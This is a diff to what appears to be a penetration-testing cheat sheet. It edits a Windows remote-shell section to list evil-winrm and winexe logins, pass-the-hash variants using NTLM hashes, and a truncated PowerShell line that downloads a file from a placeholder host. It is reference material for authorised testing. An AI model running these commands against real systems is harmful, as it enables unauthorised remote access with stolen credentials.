@@ -167,10 +167,11 @@ powershell -command "(new-object System.Net.WebClient).DownloadFile('http://$IP:
 
 ### Shell
 
-`gem install evil-winrm`
-
-- `evil-winrm -i <ip> -u <username> -p <password>`
-- PassTheHash: `evil-winrm -i <ip> -u <username> -H <NTLM_HASH>`
+- (`gem install evil-winrm`) `evil-winrm -i <ip> -u <username> -p <password>`
+- `winexe -U '<username>%<password>' //<IP> cmd.exe`
+- PassTheHash: 
+	+ `evil-winrm -i <ip> -u <username> -H <NTLM_HASH>`
+	+ `pth-winexe -U '<username>%<NTLM_HASH' //<IP> cmd.exe`
 
 ```powershell
 *Evil-WinRM* PS C:\> NET USER # list users
